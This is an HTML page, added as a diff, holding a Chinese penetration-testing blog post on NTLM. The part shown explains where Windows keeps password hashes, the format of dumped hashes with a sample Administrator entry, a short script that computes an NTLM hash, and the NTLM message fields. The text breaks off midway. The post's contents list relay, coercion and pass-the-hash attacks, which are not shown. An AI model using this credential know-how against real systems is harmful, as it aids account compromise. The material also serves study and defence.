@@ -1,0 +1,1118 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2025/09/06/NTLM-Attack/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/09/06/NTLM-Attack/","path":"2025/09/06/NTLM-Attack/","title":"NTLM - NTLM Attack"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>NTLM - NTLM Attack | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NTLM"><span class="nav-text">NTLM</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LM-hash"><span class="nav-text">LM hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NTLM-hash"><span class="nav-text">NTLM hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NTLMv2-hash"><span class="nav-text">NTLMv2 hash</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NTLM-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="nav-text">NTLM 身份认证</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0"><span class="nav-text">本地</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C"><span class="nav-text">网络</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NTLM-%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">NTLM 网络认证流量分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%8F%E5%95%86-Negotiate"><span class="nav-text">协商-Negotiate</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B4%A8%E8%AF%A2-Challenge"><span class="nav-text">质询-Challenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81-Authentication"><span class="nav-text">验证-Authentication</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Net-NTLM-hash"><span class="nav-text">Net-NTLM hash</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSP-amp-SSPI"><span class="nav-text">SSP &amp; SSPI</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BC%9A%E8%AF%9D%E5%AF%86%E9%92%A5"><span class="nav-text">会话密钥</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BC%9A%E8%AF%9D%E7%AD%BE%E5%90%8D"><span class="nav-text">会话签名</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SMB"><span class="nav-text">SMB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LDAP"><span class="nav-text">LDAP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D-MIC"><span class="nav-text">身份验证签名&#x2F;MIC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%9A%E9%81%93%E7%BB%91%E5%AE%9A-EPA"><span class="nav-text">通道绑定&#x2F;EPA</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%A8%E5%8D%8F%E8%AE%AERelay-%E7%AD%BE%E5%90%8D%E5%9B%BE"><span class="nav-text">跨协议Relay-签名图</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-text">攻击面</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crack-%E7%A0%B4%E8%A7%A3"><span class="nav-text">Crack-破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Downgrade-%E9%99%8D%E7%BA%A7%E6%94%BB%E5%87%BB"><span class="nav-text">Downgrade-降级攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTH"><span class="nav-text">PTH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE%E6%BC%8F%E6%B4%9E"><span class="nav-text">CVE漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NTLM-Relay"><span class="nav-text">NTLM Relay</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Net-NTLM-hash%E8%8E%B7%E5%8F%96"><span class="nav-text">Net-NTLM hash获取</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%BA%E5%88%B6%E8%AE%A4%E8%AF%81"><span class="nav-text">强制认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PrinterBug"><span class="nav-text">PrinterBug</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PetitPotam"><span class="nav-text">PetitPotam</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DFSCoerce"><span class="nav-text">DFSCoerce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ShadowCoerce"><span class="nav-text">ShadowCoerce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PrivExchange"><span class="nav-text">PrivExchange</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8"><span class="nav-text">综合利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84"><span class="nav-text">常规</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE%E6%BC%8F%E6%B4%9E-1"><span class="nav-text">CVE漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%B1%E5%AF%BC"><span class="nav-text">诱导</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E6%AC%BA%E9%AA%97"><span class="nav-text">网络欺骗</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Net-NTLM-hash%E5%88%A9%E7%94%A8"><span class="nav-text">Net-NTLM hash利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%90%8D%E6%89%AB%E6%8F%8F"><span class="nav-text">签名扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NTLM-Relay-1"><span class="nav-text">NTLM Relay</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Relay2SMB"><span class="nav-text">Relay2SMB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Relay2LDAP"><span class="nav-text">Relay2LDAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Relay2ADCS"><span class="nav-text">Relay2ADCS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Relay2EWS"><span class="nav-text">Relay2EWS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE"><span class="nav-text">CVE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2015-0005"><span class="nav-text">CVE-2015-0005</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2019-1040"><span class="nav-text">CVE-2019-1040</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2019-1019"><span class="nav-text">CVE-2019-1019</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2019-1166"><span class="nav-text">CVE-2019-1166</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NTLM-Reflect"><span class="nav-text">NTLM Reflect</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/09/06/NTLM-Attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="NTLM - NTLM Attack | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NTLM - NTLM Attack
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-09-06 00:00:00" itemprop="dateCreated datePublished" datetime="2025-09-06T00:00:00+08:00">2025-09-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/coinstorm.jpg" alt="coinstorm"></p>
+<a id="more"></a>
+
+<h1 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h1><p>在windows中不会存储用户的明文密码，只保存用户的密码hash值</p>
+<ul>
+<li><p>本地用户的密码hash存在本地的 <code>%SystemRoot%\system32\config\SAM</code> 数据库文件中，在注册表中的存储位置为 <code>hklm\sam\sam\domains\account\users\</code></p>
+</li>
+<li><p>域内用户的密码hash存在域控的ntds.dit文件中</p>
+</li>
+</ul>
+<blockquote>
+<p>但是在Windows server 2012 R2之前的系统 WDigest 协议会将用户明文密码储存到 lsass.exe 进程中</p>
+</blockquote>
+<p>在渗透测试中导出的密码hash常见格式如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">账户名:RID:lmhash:nthash:::</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:35b5a70f68f5ef895d52d15d8d84af6b:::</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>账户名： Windows的登录用户名</p>
+</li>
+<li><p>RID：账户相关联的相对标识符，SID的一部分，500-999为保留，标准用户RID从1000开始</p>
+</li>
+<li><p>lmhash：即LM hash，aad3b435b51404eeaad3b435b51404ee</p>
+</li>
+<li><p>nthash：即NTLM hash，35b5a70f68f5ef895d52d15d8d84af6b</p>
+</li>
+<li><p><code>:::</code> ：空字段，可能表示其他额外信息（如用户描述、组等）</p>
+</li>
+</ul>
+<h2 id="LM-hash"><a href="#LM-hash" class="headerlink" title="LM hash"></a>LM hash</h2><p>LM Hash（LAN Manager Hash）是Windows使用的最古老的密码存储，由于允许的字符集有限，因此它们很容易破解。</p>
+<p>微软在1993年引入了NT Hash。在Windows 2000版本至2003的版本系统默认使用LM Hash，当密码超过14位时，则使用NT Hash进行存储。而在Windows Visita后，默认情况下只存储NT Hash，LM Hash则不再使用。</p>
+<p>如果用户密码为空或者不存储LM Hash的话，我们抓到的LM Hash是 <code>AAD3B435B51404EEAAD3B435B51404EE</code>，该hash没有任何价值</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/t01b500665781a9a455.png"></p>
+<h2 id="NTLM-hash"><a href="#NTLM-hash" class="headerlink" title="NTLM hash"></a>NTLM hash</h2><p>NTLM hash是指Windows系统下Security Account Manager（SAM）中保存的用户密码hash，也是PTH中所用到的，注意区别后面的 <strong>Net-NTLM hash</strong></p>
+<p>从Windows Vista 和 Windows Server 2008开始，默认情况下只存储NTLM Hash，其加密算法如下：</p>
+<ul>
+<li>先将用户密码转换为十六进制格式，假设用户密码为Admin123456，则转换后为： 41646d696e313233343536</li>
+<li>将其转换为unicode格式即后面加 00，则转换后为：410064006d0069006e00310032003300340035003600</li>
+<li>使用 MD4 加密生成32位的十六进制数字串，则转化后为：ae4c0d5fb959fda8f4cb1d14a8376af4</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># NTLM hash 生成脚本</span><br><span class="line">import binascii</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">passwd &#x3D; &quot;Admin123456&quot;</span><br><span class="line">unicode_hex_passwd &#x3D; passwd.encode(&#39;utf-16le&#39;)</span><br><span class="line">md4_passwd&#x3D;hashlib.new(&quot;md4&quot;,unicode_hex_passwd).digest()</span><br><span class="line">print(binascii.hexlify(md4_passwd))</span><br></pre></td></tr></table></figure>
+
+<h2 id="NTLMv2-hash"><a href="#NTLMv2-hash" class="headerlink" title="NTLMv2 hash"></a>NTLMv2 hash</h2><p>NTLMv2 引入了更强的安全性，计算方法更加复杂，包括使用 HMAC-MD5、时间戳、随机数 (nonce)等，具体过程放在了&lt;验证-Authentication&gt; 节中</p>
+<h1 id="NTLM-身份认证"><a href="#NTLM-身份认证" class="headerlink" title="NTLM 身份认证"></a>NTLM 身份认证</h1><p>当需要进行NTLM 身份认证时，可以分为两类，一是在本地机器直接认证比如登录。二是通过网络在多个计算机之间进行NTLM身份认证。</p>
+<h2 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h2><ol>
+<li>当用户注销、重启、锁屏等，操作系统启动 <code>winlogon.exe</code> 显示登陆界面</li>
+<li>当 <code>winlogon.exe</code> 接收到输入的账号密码后，会将密码交给 <code>lsass.exe</code> 进程</li>
+<li>lsass将明文密码加密成 NTLM Hash</li>
+<li>与 SAM 数据库比较认证</li>
+</ol>
+<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>网络环境下，目前大多数的 Windows 都采用 NTLM 协议认证，NTLM协议认证采用 <strong>质询/应答 或 挑战/响应（Challenge/Response）</strong>的消息交换模式，由三种类型的消息组成：</p>
+<ul>
+<li>Type1 协商（Negotiate）</li>
+<li>Type2 质询（Challenge）</li>
+<li>Type3 认证（Authentication）</li>
+</ul>
+<p>NTLM 的网络认证还可以分为 <strong>工作组环境下的认证</strong> 和 <strong>域环境下的认证</strong></p>
+<p><strong>工作组基本流程：</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/ntlm_challenge_response.png"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/SAM_verification.png" alt="协商后流程"></p>
+<ul>
+<li>Negotiate：ClientA 向 ServerB 发送一个认证请求。</li>
+<li>Challenge：ServerB接收到请求后，生成一个16位的随机 <strong>挑战值（Challenge）</strong>明文发送回ClientA。</li>
+<li>Authentication：ClientA收到Challenge后会生成一个 <strong>响应值（Response）</strong>，响应值的生成方式：认证用户的NTLM hash 和 Challenge 结合进行加密运算得到，随后将 Response、Username 发给ServerB。</li>
+<li>ServerB 收到Response后会检查 ClientA 发送的username，并在 <strong>SAM</strong> 中查找对应的 NTLM hash（ServerB中存储有许多登录用户名和对应的密码hash），将该用户NTLM hash 与 challeng使用相同的加密运算得到一个 <strong>新的Response</strong>，两个Response比对，相同代表认证通过。</li>
+</ul>
+<p><strong>域环境基本流程：</strong></p>
+<p>所有的流程基本与工作组类似，只不过用户hash在域控的NTDS.DIT中，并且Server端会和域控之间使用 <strong>Netlogon</strong> 服务建立安全通道<strong>将认证交由域控处理</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/DC_verification.png" alt="协商后流程"></p>
+<h1 id="NTLM-网络认证流量分析"><a href="#NTLM-网络认证流量分析" class="headerlink" title="NTLM 网络认证流量分析"></a>NTLM 网络认证流量分析</h1><p>实验环境为域环境，Win7 通过 <code>net use \\192.168.1.10 &quot;password&quot; /user:test\zhangsan</code> 向Win Server 2019 发起NTLM 认证</p>
+<p>抓包从上往下简单介绍</p>
+<ul>
+<li><strong>Negotiate Protocol Request/Response</strong> 这两条消息并不直接涉及 NTLM 身份认证的内容，它们属于 <strong>SMB 协议的初步协商</strong> 阶段，用于确定客户端和服务器可以使用哪些协议特性和版本</li>
+<li>方框内为 NTLM 三步认证流程</li>
+<li>椭圆内为域内使用 Netlogon 将认证交由域控</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250818223046669.png" alt="image-20250818223046669"></p>
+<p>下面分析认证的三个数据包，具体详细字段解释当然是查看微软官方文档<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/760a9788-bd32-4d9e-87ad-2aa5970786ac">^1</a></p>
+<h2 id="协商-Negotiate"><a href="#协商-Negotiate" class="headerlink" title="协商-Negotiate"></a>协商-Negotiate</h2><p>NEGOTIATE_MESSAGE 消息字段</p>
+<table>
+<thead>
+<tr>
+<th>长度</th>
+<th>字段名</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>8B</td>
+<td>Signature</td>
+<td>‘N’, ‘T’, ‘L’, ‘M’, ‘S’, ‘S’, ‘P’, ‘\0’</td>
+</tr>
+<tr>
+<td>4B</td>
+<td>MessageType</td>
+<td>0x00000001</td>
+</tr>
+<tr>
+<td>4B</td>
+<td>NegotiateFlags</td>
+<td>NEGOTIATE结构体，用于客户端指示其支持的选项</td>
+</tr>
+<tr>
+<td>8B</td>
+<td>DomainNameFields</td>
+<td>Domain信息，取决于NegotiateFlags</td>
+</tr>
+<tr>
+<td>8B</td>
+<td>WorkstationFields</td>
+<td>WorkStation信息，取决于NegotiateFlags</td>
+</tr>
+<tr>
+<td>8B</td>
+<td>Version</td>
+<td>VERSION结构体，包含发送消息系统的粗略版本信息</td>
+</tr>
+<tr>
+<td>variable</td>
+<td>Payload</td>
+<td>包含 DomainNameBuffer、WorkstationBuffer具体的值</td>
+</tr>
+</tbody></table>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250818230212349.png" alt="image-20250818230212349"></p>
+<h2 id="质询-Challenge"><a href="#质询-Challenge" class="headerlink" title="质询-Challenge"></a>质询-Challenge</h2><p>CHALLENGE_MESSAGE 消息字段</p>
+<table>
+<thead>
+<tr>
+<th>长度</th>
+<th>字段名</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>8B</td>
+<td>Signature</td>
+<td>‘N’, ‘T’, ‘L’, ‘M’, ‘S’, ‘S’, ‘P’, ‘\0’</td>
+</tr>
+<tr>
+<td>4B</td>
+<td>MessageType</td>
+<td>0x00000002</td>
+</tr>
+<tr>
+<td>4B</td>
+<td>TargetNameFields</td>
+<td>尝试进行身份验证的目标系统或域，具体值在Payload字段后</td>
+</tr>
+<tr>
+<td>4B</td>
+<td>NegotiateFlags</td>
+<td>NEGOTIATE结构体，根据客户端提供的选项做出的选择</td>
+</tr>
+<tr>
+<td>8B</td>
+<td>ServerChallenge</td>
+<td>返回的Challenge</td>
+</tr>
+<tr>
+<td>8B</td>
+<td>Reserved</td>
+<td>0000000000000000</td>
+</tr>
+<tr>
+<td>8B</td>
+<td>TargetInfoFields</td>
+<td>尝试进行身份验证目标系统的主机信息，具体值在Payload字段后</td>
+</tr>
+<tr>
+<td>8B</td>
+<td>Version</td>
+<td>VERSION结构体，包含发送消息系统的粗略版本信息</td>
+</tr>
+<tr>
+<td>variable</td>
+<td>Payload</td>
+<td>包含 TargetNameBuffer 和 TargetInfoBuffer(AV_PAIR 结构体)</td>
+</tr>
+</tbody></table>
+<p>红框为Payload</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250818232913781.png" alt="image-20250818232913781"></p>
+<h2 id="验证-Authentication"><a href="#验证-Authentication" class="headerlink" title="验证-Authentication"></a>验证-Authentication</h2><p>AUTHENTICATE_MESSAGE 消息字段</p>
+<table>
+<thead>
+<tr>
+<th>长度</th>
+<th>字段名</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>8B</td>
+<td>Signature</td>
+<td>‘N’, ‘T’, ‘L’, ‘M’, ‘S’, ‘S’, ‘P’, ‘\0’</td>
+</tr>
+<tr>
+<td>4B</td>
+<td>MessageType</td>
+<td>0x00000003</td>
+</tr>
+<tr>
+<td>8B</td>
+<td>LmChallengeResponseFields(LM/LMv2 Response)</td>
+<td>早期LM-Response，可以理解基本弃用</td>
+</tr>
+<tr>
+<td>8B</td>
+<td>NtChallengeResponseFields(NTLM/NTLMv2 Response)</td>
+<td>就是所说的 Response，重要</td>
+</tr>
+<tr>
+<td>8B</td>
+<td>DomainNameFields</td>
+<td>Domain信息</td>
+</tr>
+<tr>
+<td>8B</td>
+<td>UserNameFields</td>
+<td>要认证的用户名</td>
+</tr>
+<tr>
+<td>8B</td>
+<td>WorkstationFields</td>
+<td>WorkStation信息</td>
+</tr>
+<tr>
+<td>8B</td>
+<td>EncryptedRandomSessionKeyFields</td>
+<td>加密后的Session Key（Session Key 是随机生成的，用于后续安全通信）</td>
+</tr>
+<tr>
+<td>4B</td>
+<td>NegotiateFlags</td>
+<td>NEGOTIATE结构体</td>
+</tr>
+<tr>
+<td>8B</td>
+<td>Version</td>
+<td>VERSION结构体，包含发送消息系统的粗略版本信息</td>
+</tr>
+<tr>
+<td>16B</td>
+<td>MIC</td>
+<td>校验和防止这个包中途被修改</td>
+</tr>
+<tr>
+<td>variable</td>
+<td>Payload</td>
+<td>包含 LmChallengeResponseBuffer、NtChallengeResponseBuffer、DomainNameBuffer、UserNameBuffer、WorkstationBuffer、EncryptedRandomSessionKeyBuffer</td>
+</tr>
+</tbody></table>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250819004904641.png" alt="image-20250819004904641"></p>
+<p>红方框中的详细内容：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250821000917467.png" alt="image-20250821000917467"></p>
+<p>在发送Type3响应Type 2 challenge时，client会生成一种或多种类型的 Responses，总共有六种：</p>
+<ul>
+<li>LM (LAN Manager) Response：由大多数旧客户端发送，这是 原始 响应类型</li>
+<li>NTLM Response：由基于 NT 的客户端发送，包括 Windows 2000 和 XP</li>
+<li>NTLMv2 Response：一种较新的响应类型，在 Windows NT Service Pack 4 中引入。它在启用了NTLM V2的系统上取代了的NTLM响应</li>
+<li>LMv2 Response ：NTLM V2系统上 LM 响应的替代品</li>
+<li>NTLM2 Session Response：在没有 NTLMv2 身份验证的情况下协商 NTLM2 会话安全性时使用，此方案会改变 LM 和 NTLM 响应的语义</li>
+<li>Anonymous Response：在建立匿名上下文时使用；不提供实际凭据，也不进行真正的身份验证</li>
+</ul>
+<p>不同类型的Response有不同生成流程<a target="_blank" rel="noopener" href="https://davenport.sourceforge.net/ntlm.htm">^2</a> ，这里看两个 <code>NTLM Response</code> 和 <code>NTLMv2 Response</code></p>
+<hr>
+<p><strong>NTLM Response</strong></p>
+<p>将16字节的 NTLM hash 空填充为 21 个字节，然后分成三组，每组7字节，作为DES加密算法的三组密钥，加密Type 2中的Challenge，生成三组8字节的密文结果，将这三个密文值连接起来得到 NTLM Response</p>
+<p><strong>NTLMv2 Response</strong></p>
+<p>启用 NTLMv2 后，NTLM 响应将被 NTLMv2 响应替换，而 LM 响应也将替换为 LMv2 响应。NTLMv2响应的计算方式如下</p>
+<ul>
+<li>获取 NTLM Hash</li>
+<li>将Unicode后 <strong>大写用户名</strong>、Unicode后 <strong>区分大小写的身份验证目标</strong>（在Type 3消息的 ‘TargetName’ 字段中指定的域或服务器名称）拼在一起，将NTLM Hash作为 HMAC-MD5 算法密钥进行加密生成16字节密文（这就是 NTLMv2 hash）</li>
+<li>创建一个 <code>blob</code> 数据块</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Description</th>
+<th>Content</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>Blob Signature</td>
+<td><code>0x01010000</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>Reserved</td>
+<td><code>long</code> (<code>0x00000000</code>)</td>
+</tr>
